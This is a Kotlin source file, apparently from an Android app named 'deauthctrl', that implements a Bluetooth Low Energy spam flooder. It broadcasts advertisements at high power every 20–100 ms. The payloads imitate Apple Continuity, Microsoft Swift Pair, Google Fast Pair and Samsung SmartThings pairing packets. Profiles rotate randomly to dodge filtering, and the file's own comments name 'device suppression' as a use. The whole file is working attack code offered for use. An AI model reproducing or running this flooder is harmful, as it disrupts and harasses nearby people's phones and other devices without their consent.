package xin.ctkqiang.deauthctrl.manager

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.os.ParcelUuid
import xin.ctkqiang.deauthctrl.model.BleAdvertLogEntry
import xin.ctkqiang.deauthctrl.model.BlePayloadProfile
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.ArrayDeque
import java.util.UUID
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong

/**
 * BLE 泛洪发送档位
 *
 * 直接映射到 [AdvertiseSettings.ADVERTISE_TX_POWER_*] 档位，
 * 通过 [BleSpamManager.setTxPower] 在运行时切换。
 */
enum class BleTxPower(val displayName: String, val settingsConstant: Int) {
    LOW("低功率", AdvertiseSettings.ADVERTISE_TX_POWER_LOW),
    MEDIUM("中功率", AdvertiseSettings.ADVERTISE_TX_POWER_MEDIUM),
    HIGH("高功率", AdvertiseSettings.ADVERTISE_TX_POWER_HIGH);
}

/**
 * BLE 泛洪循环模式
 *
 * - [SEQUENCE]: ALL 模式下依次轮换所有非 ALL Profile，index 递增取模
 * - [RANDOM]:   ALL 模式下每次随机抽一个 Profile，规避过滤趋同
 * - [SINGLE]:   锁定当前 [BleSpamManager.currentProfile]，不参与轮换
 */
enum class BleCycleMode(val displayName: String) {
    SEQUENCE("顺序轮换"),
    RANDOM("随机轮换"),
    SINGLE("固定单一"),
}

/**
 * BLE 泛洪运行期统计快照
 *
 * 由 [BleSpamManager.stats] 暴露，UI 可订阅展示。
 * 所有字段为不可变快照值，便于 Compose 直接读取。
 *
 * @property sent       成功发包累计（含被环形缓冲淘汰的历史）
 * @property failed     失败发包累计
 * @property total      sent + failed 总尝试数
 * @property successRate 成功率，0..1，total=0 时为 0
 * @property uptimeMs   本次 start 起累计运行毫秒数，停止后归零
 * @property pps        每秒发包速率，基于 uptime 计算，运行时实时更新
 * @property failRateRecent 最近 [BleSpamManager.RECENT_WINDOW] 包的失败率，0..1
 */
data class BleSpamStats(
    val sent: Long,
    val failed: Long,
    val total: Long,
    val successRate: Float,
    val uptimeMs: Long,
    val pps: Float,
    val failRateRecent: Float,
)

/**
 * BLE 广告协议数据包泛洪管理器
 *
 * 以可配置的载荷模板与发送间隔高速发送 BLE 广播包，
 * 用于压力测试、协议PoC与设备压制场景。
 *
 * ## 线程模型
 * - 主协程 [scope] 调度在 [Dispatchers.Main]，负责生命周期与状态发布
 * - [spamLoop] 实际运行在 [Dispatchers.Default]，避免阻塞 UI 线程
 * - BLE 回调由系统 binder 线程触发，可能并发修改计数器
 *
 * 因此所有跨线程访问的计数器使用原子类型（[AtomicLong]/[AtomicInteger]），
 * 避免可见性与竞态条件。
 *
 * ## 状态管理
 * - 公共状态通过 [StateFlow] 暴露，UI 通过 [collectAsState] 订阅
 * - 日志使用 [ArrayDeque] 环形缓冲，O(1) 淘汰过期条目，避免每帧 List 拷贝
 *
 * @param context 应用上下文，用于获取 BluetoothManager
 */
class BleSpamManager(private val context: Context) {

    private val bluetoothManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val adapter: BluetoothAdapter? = bluetoothManager.adapter
    private var advertiser: BluetoothLeAdvertiser? = null
    private var advertiseJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    // ─── 公共状态（StateFlow） ───────────────────────────────────────────────

    private val _log = MutableStateFlow<List<BleAdvertLogEntry>>(emptyList())
    val log: StateFlow<List<BleAdvertLogEntry>> = _log.asStateFlow()

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

    private val _error = MutableStateFlow<String?>(null)
    val error: StateFlow<String?> = _error.asStateFlow()

    private val _stats = MutableStateFlow(BleSpamStats(0, 0, 0, 0f, 0L, 0f, 0f))
    val stats: StateFlow<BleSpamStats> = _stats.asStateFlow()

    private val _activeProfile = MutableStateFlow(BlePayloadProfile.ALL)
    val activeProfile: StateFlow<BlePayloadProfile> = _activeProfile.asStateFlow()

    // ─── 配置项 ───────────────────────────────────────────────────────────────

    private var currentProfile = BlePayloadProfile.ALL
    private var advertiseIntervalMs = INTERVAL_DEFAULT_MS
    private var txPower = BleTxPower.HIGH
    private var cycleMode = BleCycleMode.SEQUENCE
    private var maxPackets: Long = MAX_PACKETS_UNLIMITED

    // ─── 原子计数器（跨 binder 线程回调 + Default 线程 spamLoop 安全访问） ─────

    private val packetIndex = AtomicInteger(0)
    private val sentCount = AtomicLong(0)
    private val failedCount = AtomicLong(0)
    private val startTimeMs = AtomicLong(0L)
    /** 最近 N 包成功/失败滑动窗口，用于实时失败率诊断 */
    private val recentResults = ArrayDeque<Boolean>()

    // ─── 当前活跃 advertising 引用（用于下一次发送前停止上一轮） ─────────────

    private var activeAdv: BluetoothLeAdvertiser? = null
    private var activeCb: AdvertiseCallback? = null

    // ─── 配置 API ──────────────────────────────────────────────────────────────

    fun setProfile(profile: BlePayloadProfile) {
        currentProfile = profile
        _activeProfile.value = profile
    }

    fun getProfile() = currentProfile

    fun setInterval(intervalMs: Long) {
        // coerceIn 确保落在系统 BLE 广告最小可行区间，避免过小导致 scheduler 抛异常
        advertiseIntervalMs = intervalMs.coerceIn(INTERVAL_MIN_MS, INTERVAL_MAX_MS)
    }

    fun getInterval() = advertiseIntervalMs

    fun setTxPower(power: BleTxPower) { txPower = power }

    fun getTxPower() = txPower

    fun setCycleMode(mode: BleCycleMode) { cycleMode = mode }

    fun getCycleMode() = cycleMode

    /**
     * 设置最大发包数。达到该值后自动停止。
     * [MAX_PACKETS_UNLIMITED] 表示不限。
     */
    fun setMaxPackets(max: Long) { maxPackets = max.coerceAtLeast(0) }

    fun getMaxPackets() = maxPackets

    // ─── 生命周期 ──────────────────────────────────────────────────────────────

    /**
     * 启动泛洪。
     *
     * 执行前置校验：bluetooth adapter 可用、已开启、advertiser 可获取。
     * 任一失败将设置 [error] 并直接返回，不会进入半启动状态。
     */
    fun start() {
        if (_isRunning.value) return
        val bt = adapter ?: run { _error.value = "no bluetooth adapter"; return }
        if (!bt.isEnabled) { _error.value = "bluetooth is off"; return }
        advertiser = bt.bluetoothLeAdvertiser
        if (advertiser == null) { _error.value = "BLE advertising not supported"; return }

        // 重置本次运行的所有计数器与日志窗口
        _isRunning.value = true
        _error.value = null
        packetIndex.set(0)
        sentCount.set(0L)
        failedCount.set(0L)
        startTimeMs.set(System.currentTimeMillis())
        synchronized(recentResults) { recentResults.clear() }
        _stats.value = BleSpamStats(0, 0, 0, 0f, 0L, 0f, 0f)

        // spamLoop 放到 Default，避免 delay 与 payload 构造阻塞 Main
        advertiseJob = scope.launch(Dispatchers.Default) {
            try {
                spamLoop()
            } catch (ce: CancellationException) {
                // 正常取消路径，不视为错误
                throw ce
            } catch (e: Throwable) {
                // 兜底：任何未捕获异常都会让 isRunning 卡 true，这里强制归位
                _isRunning.value = false
                _error.value = "spam loop crashed: ${e.message}"
            }
        }
    }

    /**
     * 停止泛洪。
     *
     * 顺序：先翻转 isRunning 让 spamLoop 自然退出循环 → cancel job → 停止活跃 advertising。
     * activeCb 可能为 null（首次未发送），使用安全调用避免 NPE。
     */
    fun stop() {
        _isRunning.value = false
        advertiseJob?.cancel()
        stopActiveAdvertising()
        advertiser = null
        // 停止后冻结 uptime 为最终值（保留展示）
        publishStats(finalize = true)
    }

    /**
     * 停止当前活跃的 advertising 回调。
     *
     * 抽取为独立函数，因为 [sendOne] 与 [stop] 都需要清理上一轮回调。
     * 主动置空引用，便于 GC 与防御性判断。
     */
    private fun stopActiveAdvertising() {
        val adv = activeAdv ?: return
        val cb = activeCb ?: run { activeAdv = null; return }
        try {
            adv.stopAdvertising(cb)
        } catch (_: SecurityException) {
            // 极少数设备在 stop 时仍要求权限，忽略避免误导 UI
        } catch (_: Throwable) {
            // stopAdvertising 不应抛业务异常，吞掉避免影响下一轮
        }
        activeAdv = null
        activeCb = null
    }

    fun clearLog() {
        _log.value = emptyList()
        packetIndex.set(0)
        sentCount.set(0L)
        failedCount.set(0L)
        synchronized(recentResults) { recentResults.clear() }
        publishStats(finalize = true)
    }

    fun destroy() {
        stop()
        scope.cancel()
    }

    // ─── 主循环 ────────────────────────────────────────────────────────────────

    /**
     * 泛洪主循环。
     *
     * 每轮：解析下一个 profile → 构造 payload → 发送 → 延迟。
     * 每发送 [STATS_PUBLISH_INTERVAL] 包刷新一次统计快照，避免每包 StateFlow 抖动。
     * 达到 [maxPackets] 自动停止。
     */
    private suspend fun spamLoop() {
        var localCycle = 0
        while (_isRunning.value) {
            val profile = resolveNextProfile(localCycle)
            val payload = buildPayload(profile)
            if (payload == null) {
                // payload 构造极少失败，失败时退避避免死循环空转
                delay(advertiseIntervalMs)
                localCycle++
                continue
            }
            sendOne(profile, payload)
            localCycle++

            // 周期性发布统计（每 25 包一次），减少 StateFlow 更新频率
            if (localCycle % STATS_PUBLISH_INTERVAL == 0) publishStats(finalize = false)

            // 滑动窗口失败率诊断
            if (localCycle % RECENT_WINDOW == 0) {
                val recentFailRate = computeRecentFailRate()
                if (recentFailRate > FAIL_RATE_WARN_THRESHOLD) {
                    _error.value = "high failure rate ${(recentFailRate * 100).toInt()}% (last $RECENT_WINDOW) -- try reducing interval"
                } else if (_error.value?.startsWith("high failure rate") == true) {
                    // 恢复正常后清除历史失败率告警
                    _error.value = null
                }
            }

            // 达到最大包数自动停止
            val total = sentCount.get() + failedCount.get()
            if (maxPackets != MAX_PACKETS_UNLIMITED && total >= maxPackets) {
                stop()
                return
            }

            delay(advertiseIntervalMs)
        }
    }

    /**
     * 根据当前 [cycleMode] 与 [currentProfile] 决定本轮发送的 profile。
     *
     * - 非 ALL profile 永远返回自身（与 mode 无关）
     * - ALL + SEQUENCE: 按 packetIndex 取模轮换
     * - ALL + RANDOM:   随机抽取
     * - ALL + SINGLE:   退化为随机选一个并锁定（语义上等同 SINGLE，但保留 ALL 标识）
     */
    private fun resolveNextProfile(cycle: Int): BlePayloadProfile {
        if (currentProfile != BlePayloadProfile.ALL) return currentProfile
        val profiles = BlePayloadProfile.entries.filter { it != BlePayloadProfile.ALL }
        return when (cycleMode) {
            BleCycleMode.SEQUENCE -> profiles[packetIndex.get() % profiles.size]
            BleCycleMode.RANDOM -> profiles.random()
            BleCycleMode.SINGLE -> profiles.first()
        }
    }

    /**
     * 发送单条 BLE 广告包。
     *
     * 流程：停止上一轮 advertising → 构造 settings/data/callback → startAdvertising。
     * callback 在 binder 线程触发，更新原子计数器与环形日志缓冲。
     */
    private fun sendOne(profile: BlePayloadProfile, data: ByteArray) {
        val adv = advertiser ?: return

        // 停止上一轮 advertising，否则 startAdvertising 会因 advertiser 单例冲突
        stopActiveAdvertising()

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(txPower.settingsConstant)
            .setConnectable(false)
            .build()

        val advData = AdvertiseData.Builder()
            .addManufacturerData(MFR_ID_BROADCAST, data)
            .setIncludeDeviceName(false)
            .setIncludeTxPowerLevel(false)
            .build()

        val idx = packetIndex.incrementAndGet()
        val cb = object : AdvertiseCallback() {
            override fun onStartSuccess(s: AdvertiseSettings?) {
                sentCount.incrementAndGet()
                pushRecentResult(success = true)
                appendLog(
                    BleAdvertLogEntry(
                        profile = profile,
                        payloadHex = data.toHexString(),
                        payloadBytes = data,
                        success = true,
                        index = idx,
                        txPowerLevel = txPower.name,
                    )
                )
            }

            override fun onStartFailure(code: Int) {
                failedCount.incrementAndGet()
                pushRecentResult(success = false)
                appendLog(
                    BleAdvertLogEntry(
                        profile = profile,
                        payloadHex = data.toHexString(),
                        payloadBytes = data,
                        success = false,
                        index = idx,
                        txPowerLevel = txPower.name,
                    )
                )
            }
        }

        try {
            adv.startAdvertising(settings, advData, cb)
            activeAdv = adv
            activeCb = cb
        } catch (e: SecurityException) {
            _error.value = "permission denied: BLUETOOTH_ADVERTISE"
            failedCount.incrementAndGet()
        } catch (e: Throwable) {
            _error.value = "advertise error: ${e.message}"
            failedCount.incrementAndGet()
        }
    }

    // ─── Payload 构造 ──────────────────────────────────────────────────────────

    /**
     * 按 profile 构造对应的厂商广播 payload。
     *
     * ALL 由 [resolveNextProfile] 已先行解析为具体 profile，这里不应再收到 ALL；
     * 但为防御性，ALL 分支退化为随机一个具体 profile。
     */
    private fun buildPayload(profile: BlePayloadProfile): ByteArray? {
        return when (profile) {
            BlePayloadProfile.APPLE_CONTINUITY ->
                byteArrayOf(0x4C, 0x00, byteArrayOf(0x05, 0x07, 0x0B, 0x0C, 0x10).random(), 0x02) + rand(17)
            BlePayloadProfile.MICROSOFT_SWIFT_PAIR ->
                byteArrayOf(0x06, 0x00, 0x01, 0x03) + rand(12)
            BlePayloadProfile.GOOGLE_FAST_PAIR ->
                byteArrayOf(0x00, 0x02, 0x71, 0x8C.toByte(), 0x10) + rand(8)
            BlePayloadProfile.SAMSUNG_SMARTTHINGS ->
                byteArrayOf(0x75, 0x00, byteArrayOf(0x01, 0x02, 0x03).random(), 0x00) + rand(12)
            BlePayloadProfile.FLIPPER_STYLE ->
                byteArrayOf(0xFF.toByte(), 0xFF.toByte()) + rand(20)
            BlePayloadProfile.ALL ->
                buildPayload(BlePayloadProfile.entries.filter { it != BlePayloadProfile.ALL }.random())
        }
    }

    // ─── 日志与统计 ────────────────────────────────────────────────────────────

    /**
     * 追加一条日志到环形缓冲。
     *
     * 使用 [ArrayDeque] 维护容量上限 [LOG_LIMIT]，超出则从头部移除——
     * 相比 `list.takeLast(200)` 的 O(n) 拷贝，这里淘汰是 O(1)。
     * 最终对外暴露的 List 仍是一次性快照，但只在容量满后才会触发。
     */
    private fun appendLog(e: BleAdvertLogEntry) {
        val current = _log.value
        val newList = if (current.size >= LOG_LIMIT) {
            // 满 200 后，采用 ArrayDeque 滚动避免每次重新分配 200 元素
            val dq = ArrayDeque(current)
            dq.removeFirst()
            dq.addLast(e)
            dq.toList()
        } else {
            current + e
        }
        _log.value = newList
    }

    /**
     * 推入一个最近发包结果到滑动窗口。
     * 窗口满 [RECENT_WINDOW] 时移除最旧的一条。
     */
    private fun pushRecentResult(success: Boolean) {
        synchronized(recentResults) {
            if (recentResults.size >= RECENT_WINDOW) recentResults.removeFirst()
            recentResults.addLast(success)
        }
    }

    private fun computeRecentFailRate(): Float {
        val snapshot = synchronized(recentResults) { recentResults.toList() }
        if (snapshot.isEmpty()) return 0f
        val fails = snapshot.count { !it }
        return fails.toFloat() / snapshot.size
    }

    /**
     * 计算并发布当前统计快照。
     *
     * @param finalize 是否为停止时的最终快照。true 时不再更新 uptime/pps。
     */
    private fun publishStats(finalize: Boolean) {
        val sent = sentCount.get()
        val failed = failedCount.get()
        val total = sent + failed
        val successRate = if (total == 0L) 0f else sent.toFloat() / total
        val uptime = if (finalize) {
            // 停止后保留最后一次运行的时长快照
            _stats.value.uptimeMs
        } else {
            maxOf(0L, System.currentTimeMillis() - startTimeMs.get())
        }
        val pps = if (uptime <= 0L) 0f else sent * 1000f / uptime
        _stats.value = BleSpamStats(
            sent = sent,
            failed = failed,
            total = total,
            successRate = successRate,
            uptimeMs = uptime,
            pps = pps,
            failRateRecent = computeRecentFailRate(),
        )
    }

    // ─── 工具 ──────────────────────────────────────────────────────────────────

    private fun rand(c: Int) = ByteArray(c).also { kotlin.random.Random.nextBytes(it) }
    private fun ByteArray.toHexString() = joinToString("") { "%02X".format(it) }

    private companion object {
        /** 厂商 ID 占位（0xFFFF 为测试用广播，避免与已注册厂商冲突） */
        const val MFR_ID_BROADCAST = 0xFFFF

        /** 发包间隔下限，低于此值 Android BLE scheduler 难以稳定调度 */
        const val INTERVAL_MIN_MS = 20L
        /** 发包间隔上限，超过此值失去"泛洪"意义 */
        const val INTERVAL_MAX_MS = 100L
        /** 默认发包间隔 */
        const val INTERVAL_DEFAULT_MS = 30L

        /** 环形日志缓冲上限 */
        const val LOG_LIMIT = 200

        /** 滑动窗口大小，用于实时失败率诊断 */
        const val RECENT_WINDOW = 100

        /** 统计快照发布周期（每 N 包发布一次，降低 StateFlow 更新频率） */
        const val STATS_PUBLISH_INTERVAL = 25

        /** 滑动窗口失败率告警阈值 */
        const val FAIL_RATE_WARN_THRESHOLD = 0.5f

        /** 不限最大发包数 */
        const val MAX_PACKETS_UNLIMITED = -1L
    }
}
